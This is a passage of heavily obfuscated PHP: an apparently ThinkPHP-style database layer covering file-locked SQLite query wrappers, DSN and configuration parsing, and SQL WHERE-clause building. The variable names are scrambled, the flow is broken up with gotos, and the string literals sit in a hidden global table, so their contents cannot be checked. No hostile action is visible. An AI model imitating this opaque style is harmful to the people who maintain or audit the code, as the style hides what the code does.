flock($A‰»†ß°²ƒ, LOCK_UN); fclose($A‰»†ß°²ƒ); return $F¿Ûªª¶Ûñ; } flock($A‰»†ß°²ƒ, LOCK_UN); goto Eá‚šìŠß·; Eá‚šìŠß·: fclose($A‰»†ß°²ƒ); show_json($eÇØ´ÓøÖ×[872], !1); return !1; goto Dˆƒ†òâĞ; Dˆƒ†òâĞ: } public function execute($B‹¢¡“öŒâ) { goto d¿¤ºßÀÄ«; CÉ¡¹Ùïƒë: if (!$b…£ƒ¯‡°) { return !1; } if (flock($b…£ƒ¯‡°, LOCK_EX)) { $fí“œ´Íšº = parent::execute($B‹¢¡“öŒâ); flock($b…£ƒ¯‡°, LOCK_UN); fclose($b…£ƒ¯‡°); return $fí“œ´Íšº; } flock($b…£ƒ¯‡°, LOCK_UN); goto cÚ§ÀÊáù; d¿¤ºßÀÄ«: $Cß£îêÈÅì =& $_SERVER[í…¶]; $fé¬ğêñœ = DATA_PATH . $Cß£îêÈÅì[870]; $b…£ƒ¯‡° = fopen($fé¬ğêñœ, $Cß£îêÈÅì[871]); goto CÉ¡¹Ùïƒë; cÚ§ÀÊáù: fclose($b…£ƒ¯‡°); show_json($Cß£îêÈÅì[872], !1); return !1; goto AÄ’ší®Óö; AÄ’ší®Óö: } } class DbSqlite3 extends DbSqlite3Base { public function query($C„•äÄ§ÜÌ) { goto AöŸ‡–¯Ö›; cÈƒ‹…ÔÖ¿: if (!$eÊ¦ÎãµÄù) { return !1; } if (flock($eÊ¦ÎãµÄù, LOCK_EX)) { $fİñã¥©½‹ = parent::query($C„•äÄ§ÜÌ); flock($eÊ¦ÎãµÄù, LOCK_UN); fclose($eÊ¦ÎãµÄù); return $fİñã¥©½‹; } flock($eÊ¦ÎãµÄù, LOCK_UN); goto Döº…ŒÎİ; Döº…ŒÎİ: fclose($eÊ¦ÎãµÄù); show_json($EŒ’†äÙ‡[872], !1); return !1; goto B»Ê–¡ï´…; AöŸ‡–¯Ö›: $EŒ’†äÙ‡ =& $_SERVER[í…¶]; $b¤ë”µß›‹ = DATA_PATH . $EŒ’†äÙ‡[870]; $eÊ¦ÎãµÄù = fopen($b¤ë”µß›‹, $EŒ’†äÙ‡[871]); goto cÈƒ‹…ÔÖ¿; B»Ê–¡ï´…: } public function execute($aáãÆŒ¼÷) { goto cÀ¾è˜‘µˆ; e›†¼„Çœ£: if (!$dÚá·†ËÖˆ) { return !1; } if (flock($dÚá·†ËÖˆ, LOCK_EX)) { $eÖ£»ËïÊ­ = parent::execute($aáãÆŒ¼÷); flock($dÚá·†ËÖˆ, LOCK_UN); fclose($dÚá·†ËÖˆ); return $eÖ£»ËïÊ­; } flock($dÚá·†ËÖˆ, LOCK_UN); goto CîÛ„†‰ê; cÀ¾è˜‘µˆ: $B»´ô†…‰› =& $_SERVER[í…¶]; $EÁ¢°†ñÕ = DATA_PATH . $B»´ô†…‰›[870]; $dÚá·†ËÖˆ = fopen($EÁ¢°†ñÕ, $B»´ô†…‰›[871]); goto e›†¼„Çœ£; CîÛ„†‰ê: fclose($dÚá·†ËÖˆ); show_json($B»´ô†…‰›[872], !1); return !1; goto FÒ¤ËÑêì™; FÒ¤ËÑêì™: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\x71" => "\75", "\156\x65\x71" => "\74\x3e", "\x67\x74" => "\x3e", "\x65\147\164" => "\76\75", "\x6c\164" => "\x3c", "\145\154\x74" => "\74\x3d", "\156\157\x74\x6c\151\153\x65" => "\x4e\x4f\124\40\x4c\111\x4b\105", "\154\151\153\x65" => "\x4c\111\x4b\105", "\x69\x6e" => "\x49\116", "\x6e\157\x74\151\x6e" => "\x4e\117\x54\40\x49\116", "\x6e\x6f\x74\x20\151\156" => "\116\117\124\40\111\116", "\142\x65\x74\x77\145\145\x6e" => "\102\x45\124\127\105\x45\x4e", "\156\157\164\x62\145\x74\x77\x65\x65\x6e" => "\x4e\x4f\124\40\102\x45\124\x57\x45\x45\x4e", "\x6e\x6f\164\40\x62\x65\164\167\145\x65\156" => "\116\x4f\x54\x20\x42\105\124\x57\105\x45\x4e"); protected $selectSql = "\123\x45\x4c\x45\103\124\45\x44\x49\x53\x54\111\x4e\103\x54\45\x20\45\106\x49\105\x4c\x44\x25\40\x46\x52\x4f\x4d\40\x25\x54\101\102\x4c\105\x25\45\x4a\117\x49\116\x25\45\x57\110\x45\122\105\45\x25\107\x52\x4f\x55\x50\45\45\110\x41\x56\111\116\107\x25\x25\x4f\x52\x44\x45\x52\45\x25\114\111\115\x49\124\45\x20\45\125\116\x49\117\116\45\x25\x43\117\115\x4d\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $c¹Óø›íèï = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[í…¶][873], $c¹Óø›íèï); } public function factory($F¤Òêœ»ë = '') { goto bÉó—°À; B¾ğæßĞˆ¨: return $bì”ƒ³³–Î; goto EÚó®­Ç; bÉó—°À: $Fá‰Ííêº =& $_SERVER[í…¶]; $F¤Òêœ»ë = $this->parseConfig($F¤Òêœ»ë); if (empty($F¤Òêœ»ë[$Fá‰Ííêº[874]])) { think_exception(think_lang($Fá‰Ííêº[875])); } goto a±­Æ”Âæ; a±­Æ”Âæ: $this->dbType = ucwords(strtolower($F¤Òêœ»ë[$Fá‰Ííêº[874]])); $cÀ¯õš¾á× = $Fá‰Ííêº[876] . $this->dbType; if (class_exists($cÀ¯õš¾á×)) { $bì”ƒ³³–Î = new $cÀ¯õš¾á×($F¤Òêœ»ë); if ($Fá‰Ííêº[726] != strtolower($F¤Òêœ»ë[$Fá‰Ííêº[874]])) { $bì”ƒ³³–Î->dbType = strtoupper($this->dbType); } else { $bì”ƒ³³–Î->dbType = $this->_getDsnType($F¤Òêœ»ë[$Fá‰Ííêº[826]]); } } else { think_exception(think_lang($Fá‰Ííêº[877]) . $Fá‰Ííêº[878] . $cÀ¯õš¾á×); } goto B¾ğæßĞˆ¨; EÚó®­Ç: } public function __call($C–«É»µÍ®, $EÊÂÜíÇ) { if (method_exists($this, $C–«É»µÍ®)) { return call_user_func_array(array($this, $C–«É»µÍ®), $EÊÂÜíÇ); } } protected function _getDsnType($bŒ¼Àï¯ƒÔ) { $Cœ×õµšËî = explode($_SERVER[í…¶][4], $bŒ¼Àï¯ƒÔ); $fÛùˆ•£ï = strtoupper(trim($Cœ×õµšËî[0])); return $fÛùˆ•£ï; } private function parseConfig($eÚŠ©½©åÛ = '') { $F¬ÇçòÜïã =& $_SERVER[í…¶]; if (!empty($eÚŠ©½©åÛ) && is_string($eÚŠ©½©åÛ)) { $eÚŠ©½©åÛ = $this->parseDSN($eÚŠ©½©åÛ); } elseif (is_array($eÚŠ©½©åÛ)) { $eÚŠ©½©åÛ = array_change_key_case($eÚŠ©½©åÛ); $eÚŠ©½©åÛ = array($F¬ÇçòÜïã[874] => $eÚŠ©½©åÛ[$F¬ÇçòÜïã[725]], $F¬ÇçòÜïã[799] => $eÚŠ©½©åÛ[$F¬ÇçòÜïã[879]], $F¬ÇçòÜïã[800] => $eÚŠ©½©åÛ[$F¬ÇçòÜïã[880]], $F¬ÇçòÜïã[797] => $eÚŠ©½©åÛ[$F¬ÇçòÜïã[881]], $F¬ÇçòÜïã[798] => $eÚŠ©½©åÛ[$F¬ÇçòÜïã[882]], $F¬ÇçòÜïã[17] => $eÚŠ©½©åÛ[$F¬ÇçòÜïã[883]], $F¬ÇçòÜïã[826] => $eÚŠ©½©åÛ[$F¬ÇçòÜïã[727]], $F¬ÇçòÜïã[13] => isset($eÚŠ©½©åÛ[$F¬ÇçòÜïã[884]]) ? $eÚŠ©½©åÛ[$F¬ÇçòÜïã[884]] : array()); } elseif (empty($eÚŠ©½©åÛ)) { if (think_config($F¬ÇçòÜïã[885]) && $F¬ÇçòÜïã[726] != strtolower(think_config($F¬ÇçòÜïã[886]))) { $eÚŠ©½©åÛ = $this->parseDSN(think_config($F¬ÇçòÜïã[885])); } else { $eÚŠ©½©åÛ = array($F¬ÇçòÜïã[874] => think_config($F¬ÇçòÜïã[886]), $F¬ÇçòÜïã[799] => think_config($F¬ÇçòÜïã[887]), $F¬ÇçòÜïã[800] => think_config($F¬ÇçòÜïã[888]), $F¬ÇçòÜïã[797] => think_config($F¬ÇçòÜïã[889]), $F¬ÇçòÜïã[798] => think_config($F¬ÇçòÜïã[890]), $F¬ÇçòÜïã[17] => think_config($F¬ÇçòÜïã[234]), $F¬ÇçòÜïã[826] => think_config($F¬ÇçòÜïã[885]), $F¬ÇçòÜïã[13] => think_config($F¬ÇçòÜïã[891])); } } return $eÚŠ©½©åÛ; } protected function initConnect($bË…—¿¨°ˆ = true) { if (1 == think_config($_SERVER[í…¶][18])) { $this->_linkID = $this->multiConnect($bË…—¿¨°ˆ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($E…å”Á‚â° = false) { $FÈ³£Ì…ï„ =& $_SERVER[í…¶]; static $F®«¾ãŠÁ = array(); if (empty($F®«¾ãŠÁ)) { foreach ($this->config as $f‹¡Ô‘®ò³ => $A°Ä’Æ­Õ) { $F®«¾ãŠÁ[$f‹¡Ô‘®ò³] = explode($FÈ³£Ì…ï„[47], $A°Ä’Æ­Õ); } } if (think_config($FÈ³£Ì…ï„[892])) { if ($E…å”Á‚â°) { $Bïèñ×¡‹ = floor(mt_rand(0, think_config($FÈ³£Ì…ï„[893]) - 1)); } else { if (is_numeric(think_config($FÈ³£Ì…ï„[894]))) { $Bïèñ×¡‹ = think_config($FÈ³£Ì…ï„[894]); } else { $Bïèñ×¡‹ = floor(mt_rand(think_config($FÈ³£Ì…ï„[893]), count($F®«¾ãŠÁ[$FÈ³£Ì…ï„[797]]) - 1)); } } } else { $Bïèñ×¡‹ = floor(mt_rand(0, count($F®«¾ãŠÁ[$FÈ³£Ì…ï„[797]]) - 1)); } $D·ì›¢®È = array($FÈ³£Ì…ï„[799] => isset($F®«¾ãŠÁ[$FÈ³£Ì…ï„[799]][$Bïèñ×¡‹]) ? $F®«¾ãŠÁ[$FÈ³£Ì…ï„[799]][$Bïèñ×¡‹] : $F®«¾ãŠÁ[$FÈ³£Ì…ï„[799]][0], $FÈ³£Ì…ï„[800] => isset($F®«¾ãŠÁ[$FÈ³£Ì…ï„[800]][$Bïèñ×¡‹]) ? $F®«¾ãŠÁ[$FÈ³£Ì…ï„[800]][$Bïèñ×¡‹] : $F®«¾ãŠÁ[$FÈ³£Ì…ï„[800]][0], $FÈ³£Ì…ï„[797] => isset($F®«¾ãŠÁ[$FÈ³£Ì…ï„[797]][$Bïèñ×¡‹]) ? $F®«¾ãŠÁ[$FÈ³£Ì…ï„[797]][$Bïèñ×¡‹] : $F®«¾ãŠÁ[$FÈ³£Ì…ï„[797]][0], $FÈ³£Ì…ï„[798] => isset($F®«¾ãŠÁ[$FÈ³£Ì…ï„[798]][$Bïèñ×¡‹]) ? $F®«¾ãŠÁ[$FÈ³£Ì…ï„[798]][$Bïèñ×¡‹] : $F®«¾ãŠÁ[$FÈ³£Ì…ï„[798]][0], $FÈ³£Ì…ï„[17] => isset($F®«¾ãŠÁ[$FÈ³£Ì…ï„[17]][$Bïèñ×¡‹]) ? $F®«¾ãŠÁ[$FÈ³£Ì…ï„[17]][$Bïèñ×¡‹] : $F®«¾ãŠÁ[$FÈ³£Ì…ï„[17]][0], $FÈ³£Ì…ï„[826] => isset($F®«¾ãŠÁ[$FÈ³£Ì…ï„[826]][$Bïèñ×¡‹]) ? $F®«¾ãŠÁ[$FÈ³£Ì…ï„[826]][$Bïèñ×¡‹] : $F®«¾ãŠÁ[$FÈ³£Ì…ï„[826]][0], $FÈ³£Ì…ï„[13] => isset($F®«¾ãŠÁ[$FÈ³£Ì…ï„[13]][$Bïèñ×¡‹]) ? $F®«¾ãŠÁ[$FÈ³£Ì…ï„[13]][$Bïèñ×¡‹] : $F®«¾ãŠÁ[$FÈ³£Ì…ï„[13]][0]); return $this->connect($D·ì›¢®È, $Bïèñ×¡‹); } public function parseDSN($dÒÁ»İ¹†) { $b½ñÖ£Ãëœ =& $_SERVER[í…¶]; if (empty($dÒÁ»İ¹†)) { return !1; } $B‹‡ˆ¬£œ³ = parse_url($dÒÁ»İ¹†); if ($B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[168]]) { $d¯êêšù¾Á = array($b½ñÖ£Ãëœ[874] => $B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[168]], $b½ñÖ£Ãëœ[799] => isset($B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[544]]) ? $B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[544]] : $b½ñÖ£Ãëœ[33], $b½ñÖ£Ãëœ[800] => isset($B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[895]]) ? $B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[895]] : $b½ñÖ£Ãëœ[33], $b½ñÖ£Ãëœ[797] => isset($B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[169]]) ? $B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[169]] : $b½ñÖ£Ãëœ[33], $b½ñÖ£Ãëœ[798] => isset($B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[170]]) ? $B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[170]] : $b½ñÖ£Ãëœ[33], $b½ñÖ£Ãëœ[17] => isset($B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[75]]) ? substr($B‹‡ˆ¬£œ³[$b½ñÖ£Ãëœ[75]], 1) : $b½ñÖ£Ãëœ[33]); } else { preg_match($b½ñÖ£Ãëœ[896], trim($dÒÁ»İ¹†), $cŸ£Âå‡™); $d¯êêšù¾Á = array($b½ñÖ£Ãëœ[874] => $cŸ£Âå‡™[1], $b½ñÖ£Ãëœ[799] => $cŸ£Âå‡™[2], $b½ñÖ£Ãëœ[800] => $cŸ£Âå‡™[3], $b½ñÖ£Ãëœ[797] => $cŸ£Âå‡™[4], $b½ñÖ£Ãëœ[798] => $cŸ£Âå‡™[5], $b½ñÖ£Ãëœ[17] => $cŸ£Âå‡™[6]); } $d¯êêšù¾Á[$b½ñÖ£Ãëœ[826]] = $b½ñÖ£Ãëœ[33]; return $d¯êêšù¾Á; } protected function debug() { $d‚¼Ö¢¡Ï• =& $_SERVER[í…¶]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $d‚¼Ö¢¡Ï•[897]; if (think_config($d‚¼Ö¢¡Ï•[898])) { think_status($d‚¼Ö¢¡Ï•[899]); think_trace($this->queryStr . $d‚¼Ö¢¡Ï•[900] . think_status($d‚¼Ö¢¡Ï•[20], $d‚¼Ö¢¡Ï•[899], 6) . $d‚¼Ö¢¡Ï•[901], $d‚¼Ö¢¡Ï•[33], $d‚¼Ö¢¡Ï•[902]); } } protected function parseLock($Aî‚ƒ…º¨® = false) { $aÁ½ø ½¬õ =& $_SERVER[í…¶]; if (!$Aî‚ƒ…º¨®) { return $aÁ½ø ½¬õ[33]; } if ($aÁ½ø ½¬õ[828] == $this->dbType) { return $aÁ½ø ½¬õ[903]; } return $aÁ½ø ½¬õ[904]; } protected function parseSet($b¢ïÏèÕ±) { $aÑ é·åçÃ =& $_SERVER[í…¶]; foreach ($b¢ïÏèÕ± as $eÎšº§ÈĞ­ => $aİ¯Ì±éÎ) { if (is_array($aİ¯Ì±éÎ) && $aÑ é·åçÃ[285] == $aİ¯Ì±éÎ[0]) { $c’‰ÀÊİ¼ğ[] = $this->parseKey($eÎšº§ÈĞ­) . $aÑ é·åçÃ[905] . $aİ¯Ì±éÎ[1]; } elseif (is_scalar($aİ¯Ì±éÎ) || is_null($aİ¯Ì±éÎ)) { $c’‰ÀÊİ¼ğ[] = $this->parseKey($eÎšº§ÈĞ­) . $aÑ é·åçÃ[905] . $this->parseValue($aİ¯Ì±éÎ); } } return $aÑ é·åçÃ[906] . implode($aÑ é·åçÃ[47], $c’‰ÀÊİ¼ğ); } protected function bindParam($F½Ù‰‚Á×, $bø›îéë¯¶) { $this->bind[$_SERVER[í…¶][4] . $F½Ù‰‚Á×] = $bø›îéë¯¶; } protected function parseBind($dÏöš¢¿›¸) { $dÏöš¢¿›¸ = array_merge($this->bind, $dÏöš¢¿›¸); $this->bind = array(); return $dÏöš¢¿›¸; } function parseKey(&$f©—Ë§æ¡, $fö¨¿Èê  = true) { if ($fö¨¿Èê ) { $f©—Ë§æ¡ = $this->parseKeyCheck($f©—Ë§æ¡); } return $f©—Ë§æ¡; } function parseKeyCheck($D‰ßÉ®ïÈ) { $c˜Ş †ô„ =& $_SERVER[í…¶]; $D‰ßÉ®ïÈ = trim($D‰ßÉ®ïÈ); if (!preg_match($c˜Ş †ô„[907], $D‰ßÉ®ïÈ)) { think_exception($c˜Ş †ô„[908] . $D‰ßÉ®ïÈ); } return $D‰ßÉ®ïÈ; } protected function parseValue($bªÆÚâ»ó) { $eğƒåò¡ÖÇ =& $_SERVER[í…¶]; if (is_string($bªÆÚâ»ó)) { $bªÆÚâ»ó = $eğƒåò¡ÖÇ[867] . $this->escapeString($bªÆÚâ»ó) . $eğƒåò¡ÖÇ[867]; } elseif (isset($bªÆÚâ»ó[0]) && is_string($bªÆÚâ»ó[0]) && strtolower($bªÆÚâ»ó[0]) == $eğƒåò¡ÖÇ[285]) { $bªÆÚâ»ó = $this->escapeString($bªÆÚâ»ó[1]); } elseif (is_array($bªÆÚâ»ó)) { $bªÆÚâ»ó = array_map(array($this, $eğƒåò¡ÖÇ[868]), $bªÆÚâ»ó); } elseif (is_bool($bªÆÚâ»ó)) { $bªÆÚâ»ó = $bªÆÚâ»ó ? $eğƒåò¡ÖÇ[83] : $eğƒåò¡ÖÇ[477]; } elseif (is_null($bªÆÚâ»ó)) { $bªÆÚâ»ó = $eğƒåò¡ÖÇ[99]; } return $bªÆÚâ»ó; } protected function parseField($BÂ¹‰ ğ) { $BÓğÑÔ» =& $_SERVER[í…¶]; if (is_string($BÂ¹‰ ğ) && strpos($BÂ¹‰ ğ, $BÓğÑÔ»[47])) { $BÂ¹‰ ğ = explode($BÓğÑÔ»[47], $BÂ¹‰ ğ); } if (is_array($BÂ¹‰ ğ)) { $CĞœä‰Ø© = array(); foreach ($BÂ¹‰ ğ as $Cù‹™â„“° => $bÜºòö¯Ãª) { if (!is_numeric($Cù‹™â„“°)) { $CĞœä‰Ø©[] = $this->parseKey($Cù‹™â„“°) . $BÓğÑÔ»[909] . $this->parseKey($bÜºòö¯Ãª); } else { $CĞœä‰Ø©[] = $this->parseKey($bÜºòö¯Ãª); } } $DõÙ¥÷•Ÿé = implode($BÓğÑÔ»[47], $CĞœä‰Ø©); } elseif (is_string($BÂ¹‰ ğ) && !empty($BÂ¹‰ ğ)) { $DõÙ¥÷•Ÿé = $BÂ¹‰ ğ; } else { $DõÙ¥÷•Ÿé = $BÓğÑÔ»[176]; } return $DõÙ¥÷•Ÿé; } protected function parseTable($DÆË‘¨å¿Ç) { $fŞ†ïˆ¶Ğ =& $_SERVER[í…¶]; if (is_array($DÆË‘¨å¿Ç)) { $e†³ÃùŸ¨ = array(); foreach ($DÆË‘¨å¿Ç as $eİäĞ”À­ñ => $D»¥ô“ê…”) { if (!is_numeric($eİäĞ”À­ñ)) { $e†³ÃùŸ¨[] = $this->parseKey($eİäĞ”À­ñ) . $fŞ†ïˆ¶Ğ[50] . $this->parseKey($D»¥ô“ê…”); } else { $e†³ÃùŸ¨[] = $this->parseKey($eİäĞ”À­ñ); } } $DÆË‘¨å¿Ç = $e†³ÃùŸ¨; } elseif (is_string($DÆË‘¨å¿Ç)) { if (strstr($DÆË‘¨å¿Ç, $fŞ†ïˆ¶Ğ[50])) { return $DÆË‘¨å¿Ç; } $DÆË‘¨å¿Ç = explode($fŞ†ïˆ¶Ğ[47], $DÆË‘¨å¿Ç); array_walk($DÆË‘¨å¿Ç, array($this, $fŞ†ïˆ¶Ğ[816])); } return $fŞ†ïˆ¶Ğ[910] . trim(implode($fŞ†ïˆ¶Ğ[911], $DÆË‘¨å¿Ç), $fŞ†ïˆ¶Ğ[822]) . $fŞ†ïˆ¶Ğ[910]; } protected function parseWhere($f¶Ñ“Ø‰©) { $a÷ìÄ³ÓÃÂ =& $_SERVER[í…¶]; $E©áØÓãÔ® = $a÷ìÄ³ÓÃÂ[33]; if (is_string($f¶Ñ“Ø‰©)) { $E©áØÓãÔ® = $f¶Ñ“Ø‰©; } else { $EÃÙáò²‰Ø = isset($f¶Ñ“Ø‰©[$a÷ìÄ³ÓÃÂ[912]]) ? strtoupper($f¶Ñ“Ø‰©[$a÷ìÄ³ÓÃÂ[912]]) : $a÷ìÄ³ÓÃÂ[33]; if (in_array($EÃÙáò²‰Ø, array($a÷ìÄ³ÓÃÂ[913], $a÷ìÄ³ÓÃÂ[914], $a÷ìÄ³ÓÃÂ[915]))) { $EÃÙáò²‰Ø = $a÷ìÄ³ÓÃÂ[50] . $EÃÙáò²‰Ø . $a÷ìÄ³ÓÃÂ[50]; unset($f¶Ñ“Ø‰©[$a÷ìÄ³ÓÃÂ[912]]); } else { $EÃÙáò²‰Ø = $a÷ìÄ³ÓÃÂ[916]; } foreach ($f¶Ñ“Ø‰© as $EäÛÄ­Ñ => $f´½²Á”›) { $E©áØÓãÔ® .= $a÷ìÄ³ÓÃÂ[265]; if (is_numeric($EäÛÄ­Ñ)) { $EäÛÄ­Ñ = $a÷ìÄ³ÓÃÂ[917]; } if (0 === strpos($EäÛÄ­Ñ, $a÷ìÄ³ÓÃÂ[70])) { $E©áØÓãÔ® .= $this->parseThinkWhere($EäÛÄ­Ñ, $f´½²Á”›); } else { if (!preg_match($a÷ìÄ³ÓÃÂ[918], trim($EäÛÄ­Ñ))) { think_exception(think_lang($a÷ìÄ³ÓÃÂ[919]) . $a÷ìÄ³ÓÃÂ[4] . $EäÛÄ­Ñ); } $eª£ˆŞğêÙ = is_array($f´½²Á”›) && isset($f´½²Á”›[$a÷ìÄ³ÓÃÂ[920]]); $EäÛÄ­Ñ = trim($EäÛÄ­Ñ); if (strpos($EäÛÄ­Ñ, $a÷ìÄ³ÓÃÂ[271])) { $F»Ä”Ê•  = explode($a÷ìÄ³ÓÃÂ[271], $EäÛÄ­Ñ); $b¡±Ü§Õ„Ù = array(); foreach ($F»Ä”Ê•  as $D‡¿ñ„¢ãŞ => $fŠ¢„òãÓ½) { $C¢ËæŒºµâ = $eª£ˆŞğêÙ ? $f´½²Á”›[$D‡¿ñ„¢ãŞ] : $f´½²Á”›; $b¡±Ü§Õ„Ù[] = $a÷ìÄ³ÓÃÂ[248] . $this->parseWhereItem($this->parseKey($fŠ¢„òãÓ½), $C¢ËæŒºµâ) . $a÷ìÄ³ÓÃÂ[815]; } $E©áØÓãÔ® .= implode($a÷ìÄ³ÓÃÂ[921], $b¡±Ü§Õ„Ù); } elseif (strpos($EäÛÄ­Ñ, $a÷ìÄ³ÓÃÂ[272])) { $F»Ä”Ê•  = explode($a÷ìÄ³ÓÃÂ[272], $EäÛÄ­Ñ); $b¡±Ü§Õ„Ù = array(); foreach ($F»Ä”Ê•  as $D‡¿ñ„¢ãŞ => $fŠ¢„òãÓ½) { $C¢ËæŒºµâ = $eª£ˆŞğêÙ ? $f´½²Á”›[$D‡¿ñ„¢ãŞ] : $f´½²Á”›; $b¡±Ü§Õ„Ù[] = $a÷ìÄ³ÓÃÂ[248] . $this->parseWhereItem($this->parseKey($fŠ¢„òãÓ½), $C¢ËæŒºµâ) . $a÷ìÄ³ÓÃÂ[815]; } $E©áØÓãÔ® .= implode($a÷ìÄ³ÓÃÂ[916], $b¡±Ü§Õ„Ù); } else { $E©áØÓãÔ® .= $this->parseWhereItem($this->parseKey($EäÛÄ­Ñ), $f´½²Á”›); } } $E©áØÓãÔ® .= $a÷ìÄ³ÓÃÂ[266] . $EÃÙáò²‰Ø; } $E©áØÓãÔ® = substr($E©áØÓãÔ®, 0, -strlen($EÃÙáò²‰Ø)); } return empty($E©áØÓãÔ®) ? $a÷ìÄ³ÓÃÂ[33] : $a÷ìÄ³ÓÃÂ[922] . $E©áØÓãÔ®; } protected function parseWhereItem($cö¿¿´’ÔŠ, $bìÓ˜¦çÂÑ) { $C¤İ¦©º  =& $_SERVER[í…¶]; $e¨‡‰‡ç¯‘ = $C¤İ¦©º [33]; if (is_array($bìÓ˜¦çÂÑ)) { if (is_string($bìÓ˜¦çÂÑ[0])) { $A±ˆ‘§ˆÖ› = strtolower($bìÓ˜¦çÂÑ[0]); if (in_array($bìÓ˜¦çÂÑ[0], array($C¤İ¦©º [905], $C¤İ¦©º [923], $C¤İ¦©º [924], $C¤İ¦©º [925], $C¤İ¦©º [926], $C¤İ¦©º [927]))) { $e¨‡‰‡ç¯‘ .= $cö¿¿´’ÔŠ . $C¤İ¦©º [50] . $bìÓ˜¦çÂÑ[0] . $C¤İ¦©º [50] . $this->parseValue($bìÓ˜¦çÂÑ[1]); } elseif (preg_match($C¤İ¦©º [928], $bìÓ˜¦çÂÑ[0])) { $e¨‡‰‡ç¯‘ .= $cö¿¿´’ÔŠ . $C¤İ¦©º [50] . $this->exp[$A±ˆ‘§ˆÖ›] . $C¤İ¦©º [50] . $this->parseValue($bìÓ˜¦çÂÑ[1]); } elseif (preg_match($C¤İ¦©º [929], $bìÓ˜¦çÂÑ[0])) { if (is_array($bìÓ˜¦çÂÑ[1])) { $Eé¢ƒÅÀ¸ö = isset($bìÓ˜¦çÂÑ[2]) ? strtoupper($bìÓ˜¦çÂÑ[2]) : $C¤İ¦©º [914]; if (in_array($Eé¢ƒÅÀ¸ö, array($C¤İ¦©º [913], $C¤İ¦©º [914], $C¤İ¦©º [915]))) { $b…óÕŞø™Ò = array(); foreach ($bìÓ˜¦çÂÑ[1] as $A¥¹ˆÛ†‘¡) { $b…óÕŞø™Ò[] = $cö¿¿´’ÔŠ . $C¤İ¦©º [50] . $this->exp[$A±ˆ‘§ˆÖ›] . $C¤İ¦©º [50] . $this->parseValue($A¥¹ˆÛ†‘¡); } $e¨‡‰‡ç¯‘ .= $C¤İ¦©º [248] . implode($C¤İ¦©º [50] . $Eé¢ƒÅÀ¸ö . $C¤İ¦©º [50], $b…óÕŞø™Ò) . $C¤İ¦©º [815]; } } else { $e¨‡‰‡ç¯‘ .= $cö¿¿´’ÔŠ . $C¤İ¦©º [50] . $this->exp[$A±ˆ‘§ˆÖ›] . $C¤İ¦©º [50] . $this->parseValue($bìÓ˜¦çÂÑ[1]); } } elseif ($C¤İ¦©º [285] == $A±ˆ‘§ˆÖ›) { $e¨‡‰‡ç¯‘ .= $C¤İ¦©º [813] . $cö¿¿´’ÔŠ . $C¤İ¦©º [50] . $bìÓ˜¦çÂÑ[1] . $C¤İ¦©º [930]; } elseif (preg_match($C¤İ¦©º [931], $bìÓ˜¦çÂÑ[0])) { if (isset($bìÓ˜¦çÂÑ[2]) && $C¤İ¦©º [285] == $bìÓ˜¦çÂÑ[2]) { $e¨‡‰‡ç¯‘ .= $cö¿¿´’ÔŠ . $C¤İ¦©º [50] . $this->exp[$A±ˆ‘§ˆÖ›] . $C¤İ¦©º [50] . $bìÓ˜¦çÂÑ[1]; } else { if (is_string($bìÓ˜¦çÂÑ[1])) { $bìÓ˜¦çÂÑ[1] = explode($C¤İ¦©º [47], $bìÓ˜¦çÂÑ[1]); } $Cì¤õÚêíÁ = implode($C¤İ¦©º [47], $this->parseValue($bìÓ˜¦çÂÑ[1])); $e¨‡‰‡ç¯‘ .= $cö¿¿´’ÔŠ . $C¤İ¦©º [50] . $this->exp[$A±ˆ‘§ˆÖ›] . $C¤İ¦©º [813] . $Cì¤õÚêíÁ . $C¤İ¦©º [815]; } } elseif (preg_match($C¤İ¦©º [932], $bìÓ˜¦çÂÑ[0])) { $FäèÖæÜÌˆ = is_string($bìÓ˜¦çÂÑ[1]) ? explode($C¤İ¦©º [47], $bìÓ˜¦çÂÑ[1]) : $bìÓ˜¦çÂÑ[1]; $e¨‡‰‡ç¯‘ .= $C¤İ¦©º [813] . $cö¿¿´’ÔŠ . $C¤İ¦©º [50] . $this->exp[$A±ˆ‘§ˆÖ›] . $C¤İ¦©º [50] . $this->parseValue($FäèÖæÜÌˆ[0]) . $C¤İ¦©º [916] . $this->parseValue($FäèÖæÜÌˆ[1]) . $C¤İ¦©º [266]; } else { think_exception(think_lang($C¤İ¦©º [919]) . $C¤İ¦©º [4] . $bìÓ˜¦çÂÑ[0]); } } else { $EÍæÖÍ“œ© = count($bìÓ˜¦çÂÑ); $e«ñ¯ğ¦´µ = isset($bìÓ˜¦çÂÑ[$EÍæÖÍ“œ© - 1]) ? strtoupper($bìÓ˜¦çÂÑ[$EÍæÖÍ“œ© - 1]) : $C¤İ¦©º [33]; if (in_array($e«ñ¯ğ¦´µ, array($C¤İ¦©º [913], $C¤İ¦©º [914], $C¤İ¦©º [915]))) { $EÍæÖÍ“œ© = $EÍæÖÍ“œ© - 1; } else { $e«ñ¯ğ¦´µ = $C¤İ¦©º [913]; } for ($b¨ò»¬„†Á = 0; $b¨ò»¬„†Á < $EÍæÖÍ“œ©; $b¨ò»¬„†Á++) { $FäèÖæÜÌˆ = is_array($bìÓ˜¦çÂÑ[$b¨ò»¬„†Á]) ? $bìÓ˜¦çÂÑ[$b¨ò»¬„†Á][1] : $bìÓ˜¦çÂÑ[$b¨ò»¬„†Á]; if ($C¤İ¦©º [285] == 